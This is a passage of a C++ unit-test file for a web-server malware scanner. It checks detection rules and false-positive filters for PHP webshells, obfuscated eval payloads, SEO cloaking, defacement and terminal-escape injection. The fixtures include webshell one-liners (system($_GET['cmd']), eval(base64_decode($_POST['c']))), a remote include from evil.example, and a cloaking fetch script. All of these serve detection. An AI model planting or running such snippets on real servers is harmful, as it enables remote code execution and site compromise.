    EXPECT_TRUE(gatedFor("/var/www/plugins/x/metadata/Struct.php", blobThenPhp()));
}

// ============================================================================
// DEFC006 - webpack development bundles wrap every module in eval("var ...")
// ============================================================================

class EvalVarTest : public ::testing::Test {
protected:
    bool kept(std::string_view content, std::string_view path = "/var/www/app.js") {
        MatchContext ctx;
        ctx.content = content;
        ctx.filePath = path;
        ctx.matchOffset = content.find("eval(");
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = content.substr(ctx.matchOffset, 16);
        return MatchEngine::applyContextFilter("DEFC006", ctx);
    }
};

TEST_F(EvalVarTest, DiscardsWebpackModuleWrapper) {
    // essential-addons-for-elementor-lite ships 108 files of this shape.
    EXPECT_FALSE(kept(
        "eval(\"var setPrototypeOf = __webpack_require__(/*! ./setPrototypeOf */ "
        "\\\"./node_modules/@babel/runtime/helpers/setPrototypeOf.js\\\");\\n\");"));
    EXPECT_FALSE(kept(
        "eval(\"var x = 1;\\n\\n//# sourceURL=webpack:///./src/index.js\\n\");"));
    EXPECT_FALSE(kept(
        "eval(\"var Handler = function () {};\\n//# sourceURL=webpack-internal:///./a.js\\n\");"));
}

// The marker has to be inside the evaluated literal, not merely somewhere in the file, so a
// payload injected into a bundle is still reported.
TEST_F(EvalVarTest, KeepsEvalWhoseOwnLiteralCarriesNoBundlerMarker) {
    // akeeba's configuration.js - genuinely the pattern the rule was written for.
    EXPECT_TRUE(kept("eval('var callback_onchange = ' + defdata['onchange']);"));
    // A payload dropped into a file that is otherwise a webpack bundle.
    EXPECT_TRUE(kept(
        "eval(\"var a = atob('ZXZpbA==');\");\n"
        "eval(\"var b = __webpack_require__(1);\");\n"));
}

// ============================================================================
// Execution evidence quoted inside a data document is a log, not code
// ============================================================================

// GoAccess writes its whole request table into the HTML report as JSON, so every attack URL
// the site was ever probed with is in it verbatim. 151 findings across eight rules on one
// production host were a log of somebody else's attack.
TEST(DataDocumentTest, DiscardsExecutionMatchInsideJsonStringValue) {
    const std::string report =
        "<!DOCTYPE html><html><head><title>report</title></head><body><script>"
        "var data = [{\"hits\": 1,\"method\": \"POST\",\"protocol\": \"HTTP/1.1\","
        "\"data\": \"\\/?up-time=eval(base64_decode(ZXZhbCg9KTs=));\"}];</script></body></html>";
    const size_t off = report.find("eval(base64_decode");
    ASSERT_NE(off, std::string::npos);

    auto gate = [&](const std::string& rule, std::string_view path) {
        MatchContext ctx;
        ctx.content = report;
        ctx.filePath = path;
        ctx.matchOffset = off;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = std::string_view(report).substr(off, 18);
        return MatchEngine::applyContextFilter(rule, ctx);
    };

    for (const char* rule : {"RCE001", "RCE004", "RCE008", "WS001", "WS005", "DRP002", "BD012"}) {
        EXPECT_FALSE(gate(rule, "/home/u/cwp_stats/goaccess/daily/site_2024-01-01.html"))
            << rule << " matched a request logged in an HTML report";
    }
}

// Both halves of the test are load-bearing: the file must be a type the server serves as
// data, and the match must be the content of a serialised field.
TEST(DataDocumentTest, KeepsExecutionMatchInExecutableFileOrOutsideAJsonValue) {
    const std::string phpShell = "<?php eval(base64_decode($_POST['c'])); ?>";
    const std::string htmlCode = "<html><script>eval(base64_decode(x));</script></html>";

    auto gate = [](const std::string& content, std::string_view path) {
        MatchContext ctx;
        ctx.content = content;
        ctx.filePath = path;
        ctx.matchOffset = content.find("eval(base64_decode");
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = std::string_view(content).substr(ctx.matchOffset, 18);
        return MatchEngine::applyContextFilter("RCE001", ctx);
    };

    // A .php webshell is untouched whatever it contains.
    EXPECT_TRUE(gate(phpShell, "/var/www/html/shell.php"));
    // An .html file with code that is not inside a JSON value still reports.
    EXPECT_TRUE(gate(htmlCode, "/var/www/html/index.html"));
}

// ============================================================================
// DEFC001 - defacement signature must not fire on ordinary English prose
// ============================================================================

TEST(DefacementContextTest, IgnoresProseAfterHackedBy) {
    auto gate = [](std::string_view matched) {
        MatchContext ctx;
        ctx.content = matched;
        ctx.filePath = "/var/www/wp-content/plugins/wordfence/readme.txt";
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = matched;
        return MatchEngine::applyContextFilter("DEFC001", ctx);
    };

    // Wordfence readme.txt: "stops you from getting hacked by identifying malicious traffic"
    EXPECT_FALSE(gate("hacked by identifying"));
    EXPECT_FALSE(gate("hacked by exploiting"));
    EXPECT_FALSE(gate("Hacked By The"));

    // A real defacement names a handle
    EXPECT_TRUE(gate("Hacked By 7x1337"));
    EXPECT_TRUE(gate("hacked by MrX"));
}

// ============================================================================
// Untrusted output - findings quote malware, so nothing quoted may reach the
// terminal as a command. See utils/SafeText.h.
// ============================================================================

TEST(SafeTextTest, EscapesTerminalControlSequences) {
    using namespace lyxbosa::safe_text;

    // DA1: the terminal answers this on stdin, and the answer ends up typed at
    // the user's next shell prompt.
    EXPECT_EQ(sanitize("A\x1b[c" "B"), "A\\x1b[cB");
    // OSC 52 writes the analyst's clipboard.
    EXPECT_EQ(sanitize("\x1b]52;c;aGk=\x07"), "\\x1b]52;c;aGk=\\x07");
    EXPECT_EQ(sanitize(std::string("nul\0here", 8)), "nul\\x00here");
    EXPECT_EQ(sanitize("del\x7f"), "del\\x7f");
}

TEST(SafeTextTest, LeavesUtf8Alone) {
    using namespace lyxbosa::safe_text;

    // Same rule as OBF036: bytes >= 0x80 are UTF-8, not control codes. Mangling
    // them would wreck every finding quoted from a non-English file.
    for (std::string_view s : {"Καλωσορίσατε", "日本語のテキスト", "Это тест",
                               "مرحبا بكم", "\xF0\x9F\x8E\x89"}) {
        EXPECT_EQ(sanitize(s), std::string(s)) << s;
        EXPECT_FALSE(needsSanitizing(s)) << s;
    }
}

TEST(SafeTextTest, TruncationCannotLeaveADanglingEscape) {
    using namespace lyxbosa::safe_text;

    // The original bug: a quote cut at a fixed byte length could end in "\033["
    // and be completed by whatever was printed next.
    std::string in(40, 'A');
    in += "\x1b[";
    for (size_t limit = 8; limit < 60; ++limit) {
        std::string out = sanitizeAndTruncate(in, limit);
        EXPECT_EQ(out.find('\x1b'), std::string::npos) << "raw ESC survived at limit " << limit;
        // and never half of the "\xNN" we wrote in its place
        auto tail = out.size() >= 3 ? out.substr(out.size() - 3) : out;
        if (tail == "...") {
            std::string body = out.substr(0, out.size() - 3);
            auto bs = body.find_last_of('\\');
            if (bs != std::string::npos) {
                EXPECT_TRUE(body.size() - bs == 4 || body.find("\\x", bs) != bs)
                    << "half an escape left at limit " << limit;
            }
        }
    }
}

TEST(SafeTextTest, NeedsSanitizingDetectsOnlyControls) {
    using namespace lyxbosa::safe_text;
    EXPECT_FALSE(needsSanitizing("plain ascii ~!@#$%^&*()"));
    EXPECT_TRUE(needsSanitizing("has\x1b" "esc"));
    EXPECT_TRUE(needsSanitizing("has\ttab"));
}

// ============================================================================
// OBF015 / OBF037 - evasions found in ir-quarantine-20260831b/aa0243e75b010ee3.php
// ============================================================================

class GotoAndEscapeTest : public ::testing::Test {
protected:
    bool fires(const char* code, const char* content) {
        const auto* rule = getRuleByCode(code);
        EXPECT_NE(rule, nullptr);
        return rule && !rule->findMatches(content).empty();
    }
};

// The emitter puts no space after the semicolon; the rule used to require one.
TEST_F(GotoAndEscapeTest, GotoLabelNeedsNoWhitespaceAfterSemicolon) {
    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye;LQL4spRSOK: tQtVYGj1();goto NGPmYI;wQEDHkCO: $a=1;"));
    // still fires with a space, as before
    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye; LQL4spRSOK: $a=1;"));
}

// ALL_CAPS labels are how humans write the one legitimate use of goto.
TEST_F(GotoAndEscapeTest, GotoIgnoresUppercaseLabels) {
    EXPECT_FALSE(fires("OBF015", "<?php goto SCANNER_TOP;SCANNER_TOP: $a=1;"));
}

// Interleaving the two notations slipped between the octal-only and hex-only rules.
TEST_F(GotoAndEscapeTest, FlagsInterleavedOctalAndHexEscapes) {
    EXPECT_TRUE(fires("OBF037",
        "<?php echo \"\\74\\144\\x69\\166\\x3e\\x3c\\x69\\156\\160\\165\\x74\\x20\\x74\\171\";"));
}

// One convention throughout is what hand-written code looks like - binary constants
// in getID3, phpseclib and minified JS do this all day and must stay silent.
TEST_F(GotoAndEscapeTest, IgnoresSingleStyleEscapeRuns) {
    EXPECT_FALSE(fires("OBF037",
        "<?php $x = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\";"));
    EXPECT_FALSE(fires("OBF037",
        "<?php $x = \"\\101\\102\\103\\104\\105\\106\\107\\110\\111\\112\\113\\114\";"));
}

TEST_F(GotoAndEscapeTest, IgnoresShortMixedRuns) {
    EXPECT_FALSE(fires("OBF037", "<?php $x = \"\\x41\\102\\x43\";"));
}

// ============================================================================
// Every builtin pattern must actually compile.
//
// PatternCache::get() returns nullptr when RE2 rejects a pattern, and both
// matches() and findMatches() skip a null quietly - so a syntax error does not
// fail the build or the scan, it silently disables the rule. That is the worst
// possible failure mode for a scanner, and it is exactly the risk taken on by
// rewriting 90 patterns to wrap builtin names in (?i:...).
// ============================================================================

TEST(BuiltinPatternTest, EveryPatternCompiles) {
    size_t checked = 0;

    for (const auto* rule : getAllBuiltinRules()) {
        ASSERT_NE(rule, nullptr);
        for (const auto& pattern : rule->patterns) {
            RE2::Options opts;
            opts.set_log_errors(false);
            opts.set_case_sensitive(!pattern.case_insensitive);
            opts.set_dot_nl(true);
            RE2 re(std::string(pattern.regex), opts);

            EXPECT_TRUE(re.ok())
                << rule->code.toString() << " (" << rule->name << ") has an invalid pattern:\n"
                << "  " << pattern.regex << "\n"
                << "  RE2: " << re.error();
            ++checked;
        }
    }

    EXPECT_GT(checked, 100u) << "expected the full builtin pattern set to be walked";
}

// RE2 must actually honour the inline flag the rewrite depends on. If this ever
// stops holding, every (?i:...) rule degrades to case-sensitive silently.
TEST(BuiltinPatternTest, Re2SupportsInlineCaseInsensitiveGroups) {
    RE2::Options opts;
    opts.set_log_errors(false);
    RE2 re(R"((?i:eval)\s*\(\s*(?i:base64_decode)\s*\()", opts);

    ASSERT_TRUE(re.ok()) << re.error();
    EXPECT_TRUE(RE2::PartialMatch("eval(base64_decode(", re));
    EXPECT_TRUE(RE2::PartialMatch("EvAl(BaSe64_DeCoDe(", re));
    EXPECT_TRUE(RE2::PartialMatch("EVAL(BASE64_DECODE(", re));
    // the scope of the flag must not leak past its group
    RE2 scoped(R"((?i:eval)\(X\))", opts);
    ASSERT_TRUE(scoped.ok()) << scoped.error();
    EXPECT_TRUE(RE2::PartialMatch("EVAL(X)", scoped));
    EXPECT_FALSE(RE2::PartialMatch("EVAL(x)", scoped));
}

// PHP resolves function names case-insensitively, so these all execute.
TEST(BuiltinPatternTest, CaseVariantsOfBuiltinsStillMatch) {
    struct Case { const char* code; const char* content; };
    const Case cases[] = {
        {"RCE001", "<?php EvAl(BaSe64_DeCoDe(\"AAAA\"));"},
        {"RCE001", "<?php EVAL(BASE64_DECODE(\"AAAA\"));"},
        {"RCE005", "<?php AsSeRt($_POST[\"x\"]);"},
        {"RCE008", "<?php SySTeM($_GET[\"cmd\"]);"},
        {"EXP006", "<?php UnSerialize($_COOKIE[\"c\"]);"},
        {"WS008",  "<?php Move_Uploaded_File($f, $_GET[\"d\"]);"},
    };

    for (const auto& c : cases) {
        const auto* rule = getRuleByCode(c.code);
        ASSERT_NE(rule, nullptr) << c.code;
        EXPECT_TRUE(rule->matches(c.content))
            << c.code << " missed a case variant: " << c.content;
    }
}

// ============================================================================
// Literal gates
//
// A gate says "this pattern cannot match a file without these substrings", and
// the engine uses it to skip work. If a gate is wrong the pattern is silently
// never run on files it should have matched - a missed detection that produces
// no error anywhere. These tests exist because that failure is invisible.
// ============================================================================

class LiteralGateTest : public ::testing::Test {
protected:
    // Two text projections of a pattern. A gate literal has to show up in one of
    // them; this is a sanity check on the declaration, not a proof of requiredness
    // (that is what the corpus differential against the previous binary is for).
    //
    //   1. escapes resolved  - finds contiguous literals: "base64_decode"
    //   2. group syntax also removed - finds distributed ones: "$_get" inside
    //      "\$_(GET|POST|REQUEST)", which is spelled across a group boundary
    static bool appearsInAnyExpansion(std::string_view rx, const std::string& literal) {
        std::string flat;
        for (size_t i = 0; i < rx.size(); ++i) {
            if (rx[i] == '\\' && i + 1 < rx.size()) {
                // An escaped letter or digit is a class (\s \w \d \n \x41);
                // escaped punctuation stands for itself (\$ \{ \( \. \|).
                const char n = rx[i + 1];
                if (!std::isalnum(static_cast<unsigned char>(n))) flat += n;
                ++i;
                continue;
            }
            flat += rx[i];
        }
        std::transform(flat.begin(), flat.end(), flat.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        if (flat.find(literal) != std::string::npos) return true;

        // 3. prefix distributed over a group's alternatives, which is how
        //    "\$_(GET|POST|REQUEST)" spells $_get, $_post and $_request.
        for (size_t open = flat.find('('); open != std::string::npos;
             open = flat.find('(', open + 1)) {
            const size_t close = flat.find(')', open);
            if (close == std::string::npos) break;
            const std::string body = flat.substr(open + 1, close - open - 1);
            if (body.find('(') != std::string::npos) continue;   // nested, skip
            if (body.find('|') == std::string::npos) continue;   // not an alternation

            // the literal run immediately before the group
            size_t p = open;
            while (p > 0) {
                const char c = flat[p - 1];
                if (std::isalnum(static_cast<unsigned char>(c)) || c == '_' || c == '$') --p;
                else break;
            }
            const std::string prefix = flat.substr(p, open - p);

            size_t start = 0;
            while (start <= body.size()) {
                const size_t bar = body.find('|', start);
                const size_t end = (bar == std::string::npos) ? body.size() : bar;
                if ((prefix + body.substr(start, end - start)).find(literal) != std::string::npos) {
                    return true;
                }
                if (bar == std::string::npos) break;
                start = bar + 1;
            }
        }

        std::string collapsed;
        for (size_t i = 0; i < flat.size(); ++i) {
            if (flat.compare(i, 4, "(?i:") == 0) { i += 3; continue; }
            if (flat.compare(i, 3, "(?:") == 0) { i += 2; continue; }
            const char c = flat[i];
            if (c == '(' || c == ')' || c == '|') continue;
            collapsed += c;
        }
        return collapsed.find(literal) != std::string::npos;
    }
};

// Catches the failure that actually happened while building this: gates generated
// in one order and applied in another, so every literal guarded the wrong rule.
// A gate literal must at minimum be text that appears in the pattern it guards.
TEST_F(LiteralGateTest, EveryGateLiteralAppearsInThePatternItGuards) {
    size_t checked = 0;
    for (const auto* rule : getAllBuiltinRules()) {
        for (const auto& pattern : rule->patterns) {

            for (const auto& entry : pattern.gate) {
                if (entry.empty()) continue;
                // an entry is alternatives separated by '|'; each must appear
                size_t start = 0;
                while (start <= entry.size()) {
                    const size_t bar = entry.find('|', start);
                    const size_t end = (bar == std::string_view::npos) ? entry.size() : bar;
                    const std::string alt(entry.substr(start, end - start));
                    if (!alt.empty()) {
                        ++checked;
                        EXPECT_TRUE(appearsInAnyExpansion(pattern.regex, alt))
                            << rule->code.toString() << " (" << rule->name << ")\n"
                            << "  gate literal : " << alt << "\n"
                            << "  pattern      : " << pattern.regex;
                    }
                    if (bar == std::string_view::npos) break;
                    start = bar + 1;
                }
            }
        }
    }
    EXPECT_GT(checked, 100u) << "expected the gated pattern set to be walked";
}

// A gated pattern must still fire on text it is supposed to match. These are the
// techniques the gates most affect; if a gate is over-specified this fails.
TEST_F(LiteralGateTest, GatedRulesStillMatchTheirTechnique) {
    struct Case { const char* code; const char* content; };
    const Case cases[] = {
        {"RCE001", "<?php eval(base64_decode(\"AAAA\"));"},
        {"RCE001", "<?php EvAl( BaSe64_DeCoDe (\"AAAA\"));"},
        {"RCE002", "<?php eval(gzinflate(\"x\"));"},
        {"RCE004", "<?php eval($_GET['x']);"},
        {"RCE005", "<?php assert($_POST['x']);"},
        {"RCE008", "<?php system($_GET['cmd']);"},
        {"RCE008", "<?php passthru($_REQUEST['c']);"},
        {"EXP006", "<?php unserialize($_COOKIE['c']);"},
        {"EXP007", "<?php unlink($_GET['f']);"},
        {"WS008",  "<?php move_uploaded_file($a, $_POST['d']);"},
        {"BD012",  "<?php file_put_contents($f, $_POST['data']);"},
        {"OBF009", "<?php base64_decode(base64_decode($x));"},
        {"DRP005", "<?php include('https://evil.example/x.txt');"},
    };
    for (const auto& c : cases) {
        const auto* rule = getRuleByCode(c.code);
        ASSERT_NE(rule, nullptr) << c.code;
        EXPECT_TRUE(rule->matches(c.content)) << c.code << " on: " << c.content;
    }
}

// The prefilter's own semantics: AND across entries, OR inside one, case folded.
TEST_F(LiteralGateTest, PrefilterSemantics) {
    using lyxbosa::LiteralPrefilter;

    rules::Pattern both{R"(x)", "", false, {"alpha", "beta"}};
    rules::Pattern either{R"(x)", "", false, {"gamma|delta"}};
    rules::Pattern none{R"(x)", "", false, {}};

    LiteralPrefilter pf;
    const size_t hBoth = pf.add(both);
    const size_t hEither = pf.add(either);
    const size_t hNone = pf.add(none);
    ASSERT_TRUE(pf.compile());
    EXPECT_EQ(hNone, LiteralPrefilter::kAlwaysRun);

    auto present = pf.scan("nothing relevant here");
    EXPECT_FALSE(pf.allows(hBoth, present));
    EXPECT_FALSE(pf.allows(hEither, present));
    EXPECT_TRUE(pf.allows(hNone, present));

    present = pf.scan("only ALPHA is here");   // AND not satisfied
    EXPECT_FALSE(pf.allows(hBoth, present));

    present = pf.scan("Alpha and BETA both");  // case-insensitive
    EXPECT_TRUE(pf.allows(hBoth, present));

    present = pf.scan("just DELTA");           // OR satisfied by one alternative
    EXPECT_TRUE(pf.allows(hEither, present));
}

// An unusable prefilter must fall back to running everything, never to skipping.
TEST_F(LiteralGateTest, EmptyPrefilterAllowsEverything) {
    using lyxbosa::LiteralPrefilter;
    LiteralPrefilter pf;
    rules::Pattern p{R"(x)", "", false, {"needle"}};
    const size_t h = pf.add(p);
    // compile() never called: scan returns empty, which means "run everything"
    EXPECT_TRUE(pf.allows(h, LiteralPrefilter::Present{}));
}

// ============================================================================
// Rules repaired against the live production report
//
// Each case below is a real line from a real file - the false positive on the left,
// the technique on the right. The pairing is the point: several of these rules had
// a shape that matched the sample they were written from and nothing else.
// ============================================================================

namespace {

bool ruleFires(const char* code, std::string_view content) {
    const auto* rule = getRuleByCode(code);
    EXPECT_NE(rule, nullptr) << code;
    return rule && !rule->findMatches(content).empty();
}

}  // namespace

// BD002: the superglobal has to be the *hook*, which is argument three.
TEST(RepairedRuleTest, CronPersistenceNeedsTheHookNameNotTheRecurrence) {
    // WP Fastest Cache: the admin picked the recurrence from the plugin's dropdown.
    // Note the proposed fix `[^)]*,\s*\$` would have matched this on `, $this`.
    EXPECT_FALSE(ruleFires("BD002",
        R"(wp_schedule_event($timestamp, $_POST["wpFastestCacheTimeOut"], $this->slug());)"));
    // The attacker choosing what runs.
    EXPECT_TRUE(ruleFires("BD002",
        R"(wp_schedule_event(time(), 'hourly', $_POST['hook']);)"));
}

// RCE008 / EXP009: the function alternation must not match an identifier tail.
TEST(RepairedRuleTest, ShellExecutionAlternationIsAnchored) {
    EXPECT_FALSE(ruleFires("RCE008", R"($db->exec($_POST['sql']);)"));
    EXPECT_FALSE(ruleFires("RCE008", R"(wpvivid_backup_module_add_exec($_POST['x']);)"));
    EXPECT_FALSE(ruleFires("RCE008", R"(function my_exec($_POST) {})"));

    EXPECT_TRUE(ruleFires("RCE008", R"(system($_GET['cmd']);)"));
    EXPECT_TRUE(ruleFires("RCE008", R"(  shell_exec($_POST['c']);)"));
    EXPECT_TRUE(ruleFires("RCE008", R"(echo passthru($_REQUEST['q']);)"));
}

TEST(RepairedRuleTest, EmbeddedShellPayloadNeedsAQuotedOpenerAndASuperglobal) {
    // rosell-dk/exec-with-fallback, matched at line 1 on its own docblock.
    EXPECT_FALSE(ruleFires("EXP009",
        "<?php\n\nnamespace ExecWithFallback;\n\n/**\n * Emulate exec() with proc_open()\n */\n"));
    // The literal English phrase "Booking System (".
    EXPECT_FALSE(ruleFires("EXP009",
        "<?php\n/**\n * Plugin support: Woocommerce Easy Booking System (Importer support)\n */\n"));
    // A payload written into a string, which is what the rule is for.
    EXPECT_TRUE(ruleFires("EXP009",
        R"($shell = '<?php system($_GET["c"]); ?>'; file_put_contents($p, $shell);)"));
    EXPECT_TRUE(ruleFires("EXP009",
        R"($p = "<?php passthru(\$_POST['x']);";)"));
}

// OBF022: ${...} is also a JavaScript template-literal substitution.
TEST(RepairedRuleTest, HexVariableVariableIsNotAJsTemplateLiteral) {
    // WordPress core block-editor.js, 24 copies of it on one host.
    EXPECT_FALSE(ruleFires("OBF022",
        R"(selector = `${selector.substring(0, o)}(${"\xB6".repeat(n - 2)})`;)"));
    // PHP variable-variable: nothing but the escaped string inside the braces.
    EXPECT_TRUE(ruleFires("OBF022", R"(${"\x47\x4c\x4f\x42\x41\x4c\x53"}['x'] = 1;)"));
}

// SEO001 pattern 2: a hidden wrapper div with no link in it is a layout wrapper.
TEST(RepairedRuleTest, HiddenDivNeedsAnInlineExternalHref) {
    // PixelYourSite's settings popover, and the dark-mode-image trick in HTML email.
    EXPECT_FALSE(ruleFires("SEO001",
        R"(<div id="pys-search_event" style="display: none; visibility: hidden">)"
        R"(<h3>Search</h3></div><div class="x"><a href="#">help</a></div>)"));
    EXPECT_FALSE(ruleFires("SEO001",
        R"(<div class="dark-img" style="display:none; visibility:hidden;" align="center">)"
        "\n<img src=\"logo.png\">\n</div>"));
    // An injected spam block carries its destination inline.
    EXPECT_TRUE(ruleFires("SEO001",
        R"(<div style="visibility:hidden"><a href="https://spam.example/casino">x</a></div>)"));
}

// RCE011: each array function keeps its callback in a different position.
TEST(RepairedRuleTest, ArrayCallbackRespectsArgumentPosition) {
    // array_filter with one argument filters empty values; it takes no callback.
    EXPECT_FALSE(ruleFires("RCE011", R"(if ( empty( array_filter( $_POST['id'] ) ) ) {)"));
    EXPECT_FALSE(ruleFires("RCE011", R"($x = array_filter( $_POST['ht_ctc_pagelevel'] );)"));
    // A nested sanitising call must not be read as the data argument.
    EXPECT_FALSE(ruleFires("RCE011",
        R"($a = array_filter( array_map( 'absint', $_POST['imgs'] ) );)"));

    EXPECT_TRUE(ruleFires("RCE011", R"(array_map($_POST['cb'], $rows);)"));
    EXPECT_TRUE(ruleFires("RCE011", R"(array_filter($rows, $_GET['cb']);)"));
}

// DRP010: building a path under DOCUMENT_ROOT is not a drop; writing to one is.
TEST(RepairedRuleTest, DocumentRootDropNeedsAWrite) {
    // TimThumb resolving a source path - a read.
    EXPECT_FALSE(ruleFires("DRP010",
        R"(if(@file_exists($_SERVER['DOCUMENT_ROOT'] . '/' . $src)) {)"));
    EXPECT_TRUE(ruleFires("DRP010",
        R"(file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/' . $name, $payload);)"));
}

// DEFC004: suppressing the context menu on a generated element is ordinary UI work.
TEST(RepairedRuleTest, ContextMenuBlockingMustTargetThePage) {
    // mCustomScrollbar building its own drag handle.
    EXPECT_FALSE(ruleFires("DEFC004",
        R"(s=["<a href='#' class='"+c[13]+"' oncontextmenu='return false;' "+t+" />"];)"));
    EXPECT_TRUE(ruleFires("DEFC004", R"(document.oncontextmenu = function(){return false;})"));
    EXPECT_TRUE(ruleFires("DEFC004", R"(<body oncontextmenu="return false" onselectstart="x">)"));
}

// The comment gap: only whitespace used to be allowed between a name and its paren.
TEST(RepairedRuleTest, EvalFamilySeesThroughInterleavedComments) {
    EXPECT_TRUE(ruleFires("RCE001",
        R"(@/*!50000*/eval/***//****/ /*x*/(base64_decode($p));)"));
    EXPECT_TRUE(ruleFires("RCE004", R"(eval/**/(  $_POST['c'] );)"));
    EXPECT_TRUE(ruleFires("RCE014",
        R"(/********/ /****/@/***//*!50000*/eval/***/ /**/(openssl_decrypt($d,'AES-128-ECB',$k,0));)"));
    // ...and the ordinary spelling still matches.
    EXPECT_TRUE(ruleFires("RCE001", R"(eval(base64_decode($p));)"));
}

// OBF029: uniform width is what separates a staged payload from string building.
TEST(RepairedRuleTest, ChunkAccumulationNeedsUniformBase64Fragments) {
    std::string payload = "<?php\n$z = \"\";\n";
    for (int i = 0; i < 40; ++i) payload += "$z .= \"Skdze\";\n";
    payload += "$fn = 'base64_decode'; eval($fn($z));\n";
    EXPECT_TRUE(ruleFires("OBF029", payload));

    // Hand-written HTML building: a different width every time, and not base64.
    std::string html = "<?php\n$out = '';\n";
    const char* parts[] = {"<div class=\"row\">", "<span>", "</span>", "<p>Hello there</p>",
                           "</div>", "<ul><li>one</li>", "<li>two</li></ul>", "<br/>"};
    for (int i = 0; i < 40; ++i) html += std::string("$out .= '") + parts[i % 8] + "';\n";
    EXPECT_FALSE(ruleFires("OBF029", html));

    // A short run is not staging.
    std::string few = "<?php\n$z = \"\";\n";
    for (int i = 0; i < 10; ++i) few += "$z .= \"Skdze\";\n";
    EXPECT_FALSE(ruleFires("OBF029", few));
}

// OBF038: "wordless" alone matched banner rules and docblock fragments.
TEST(RepairedRuleTest, NoiseCommentsAreNotBannersOrDocblocks) {
    // WordPress core view.js style banner separators.
    std::string banners;
    for (int i = 0; i < 30; ++i) banners += "/****/\nvar a" + std::to_string(i) + " = 1;\n";
    EXPECT_FALSE(ruleFires("OBF038", banners));

    // sodium_compat's arithmetic and @var notes.
    std::string docblocks;
    for (int i = 0; i < 30; ++i) {
        docblocks += "/**\n * @var int\n */\n/* h = 0 */\n/* 1 << 128 */\n";
    }
    EXPECT_FALSE(ruleFires("OBF038", docblocks));

    // Icon-font CSS documenting one glyph per comment.
    std::string icons;
    for (int i = 0; i < 30; ++i) {
        icons += ".i" + std::to_string(i) + ":before { content: '\\e00" +
                 std::to_string(i % 10) + "'; } /* '\xEE\xA0\x82' */\n";
    }
    EXPECT_FALSE(ruleFires("OBF038", icons));

    // Generated filler: high character diversity, or distinct non-ASCII symbol runs.
    std::string noise = "<?php ";
    const char* junk[] = {"/*-9-mk%J,N3-*/", "/*-L>#$|d@^jy-*/", "/*-rVXGU=o-*/",
                          "/*-@&B3Z#XU9-*/", "/*-{`Sd1E89-*/", "/*-@+.eA.DK-*/"};
    for (int i = 0; i < 12; ++i) noise += std::string(junk[i % 6]) + "$a=1;";
    EXPECT_TRUE(ruleFires("OBF038", noise));
}

// SEO008: each condition alone is ordinary; the combination is not.
TEST(RepairedRuleTest, UserAgentCloakingNeedsCrawlersAndAFetchAndAnEmitter) {
    // A caching plugin naming crawlers, with no remote fetch of content to print.
    EXPECT_FALSE(ruleFires("SEO008",
        R"(<?php $ua = $_SERVER['HTTP_USER_AGENT']; )"
        R"(if (preg_match('/googlebot|bingbot|yandexbot/i', $ua)) { return true; })"));
    // A file that fetches and echoes but does not look at the user agent at all.
    EXPECT_FALSE(ruleFires("SEO008",
        R"(<?php $r = curl_exec($ch); echo $r;)"));

    EXPECT_TRUE(ruleFires("SEO008",
        R"(<?php $bots='Googlebot,bingbot,YandexBot,Baiduspider,AhrefsBot';)"
        R"($ua=$_SERVER['HTTP_USER_AGENT'] ?? '';)"
        R"(if (preg_match('/'.str_replace(',','|',$bots).'/i',$ua)) {)"
        R"($c=curl_exec(curl_init('https://spam.example/x.txt')); echo $c; exit; })"));
}

// OBF005: the shape is right, but the folded value is what makes it a finding.
TEST(RepairedRuleTest, StrrevReportsOnlyWhenItSpellsSomethingSensitive) {
    auto gate = [](std::string_view matched) {
        MatchContext ctx;
        ctx.content = matched;
        ctx.filePath = "/var/www/wp-content/themes/x/includes/utils.php";
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = matched;
        return MatchEngine::applyContextFilter("OBF005", ctx);
    };

    // ThemeREX spelling "iframe", with a comment between the fragments.
    EXPECT_FALSE(gate("strrev( 'e'  // a container name\n  . 'mar'\n  . 'fi' )"));
    EXPECT_FALSE(gate("strrev('t' . 'pircs')"));            // "script"

    // The technique: the folded value names something dangerous.
    EXPECT_TRUE(gate("strrev(\"noi\".\"tcnuf\".\"_eta\".\"erc\")"));  // create_function
    EXPECT_TRUE(gate("strrev('edoced_' . '46esab')"));      // base64_decode
}

// ============================================================================
// Regressions found by rescanning the whole production tree
//
// The 266-file sample corpus reproduced every rule that reported, but it could not
// contain a file no rule had reported *before*. These two false positives were
// introduced by the new rules and only appeared on a full 1.3 M-file rescan.
// ============================================================================

// SEO008: knowing what a crawler is, and fetching something, are both ordinary.
// The technique is fetching *a hardcoded address* and serving it to crawlers, so the
// address and the fetch are written together.
TEST(RescanRegressionTest, CloakingNeedsTheFetchTargetNextToTheFetch) {
    // A maintenance-mode plugin: names crawlers so it can let them through, and
    // contains URLs elsewhere in 290 KB of unrelated code.
    std::string maintenance =
        "<?php\n$crawlers = 'Googlebot,bingbot,YandexBot,Baiduspider,Slurp';\n"
        "if (preg_match($re, $_SERVER['HTTP_USER_AGENT'] ?? '')) { return true; }\n";
    maintenance += std::string(4000, ' ') + "\n";
    maintenance += "$logo = file_get_contents($this->plugin_dir . '/img/logo.png');\n";
    maintenance += std::string(4000, ' ') + "\n";
    maintenance += "$docs = 'https://example.com/documentation';\necho $html;\n";
    EXPECT_FALSE(ruleFires("SEO008", maintenance));

    // A security plugin's firewall: crawler names and a curl call, but no URL literal
    // for it to fetch at all.
    std::string firewall =
        "<?php\nif (preg_match('/googlebot|bingbot|YandexBot|Baiduspider/i', "
        "$_SERVER['HTTP_USER_AGENT'])) { $this->block(); }\n";
    firewall += std::string(2000, ' ') + "\n$r = curl_exec($ch);\necho $r;\n";
    EXPECT_FALSE(ruleFires("SEO008", firewall));

    // The cloaker: the address it serves sits right next to the call that fetches it.
    EXPECT_TRUE(ruleFires("SEO008",
        "<?php\n$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';\n"
        "if (preg_match('/googlebot|bingbot|yandexbot|ahrefsbot/i', $ua)) {\n"
        "  $u = 'https://storage.example.com/cdn/spam.html';\n"
